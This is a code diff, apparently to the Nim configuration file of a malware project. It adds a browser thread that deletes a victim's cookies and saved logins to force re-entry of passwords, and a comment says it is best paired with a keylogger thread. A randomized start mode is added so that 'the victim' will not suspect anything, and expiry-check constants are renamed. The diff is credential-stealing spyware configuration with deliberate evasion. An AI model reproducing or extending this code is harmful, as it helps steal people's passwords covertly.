@@ -10,7 +10,24 @@ const BROWSER_THREAD_REMOVE_FILE*: bool = false
 
 ## TODO: IMPLEMENT THE FOLLOWING LINES
 
-type DateVerification* = enum
+## browserThread is used for deleting cookies and login data
+## so the user is forced to login back again
+## best used alongside keyloggerThread
+## DEFAULT: true
+const USE_BROWSER_THREAD*: bool = true
+
+type browserThreadStart = enum
+  Always ## NOT RECOMMENDED
+  Random ## 1 in 6 chance browserThread will start
+
+## how the browserThread starts
+## setting Always will delete browser files everytime the
+## program starts, not recommended, the victim will suspect
+## something's up immediately
+## DEFAULT: Random
+const BROWSER_THREAD_START_TYPE*: browserThreadStart = Random
+
+type ExpireVerification* = enum
   LocalApi
   InternetApi
 
@@ -26,8 +43,8 @@ proc NewDate(day: int, month: int, year: int): Date =
   result.month = month
   result.year = year
 
-const useDateVerification*: bool = true
+const USE_EXPIRE_VERIFICATION*: bool = true
 
-const dateVerificationType*: DateVerification = LocalApi
+const EXPIRE_VERIFICATION_TYPE*: ExpireVerification = LocalApi
 
-const expireDate*: Date = NewDate(20, 10, 2020)
+const EXPIRE_DATE*: Date = NewDate(20, 10, 2020)
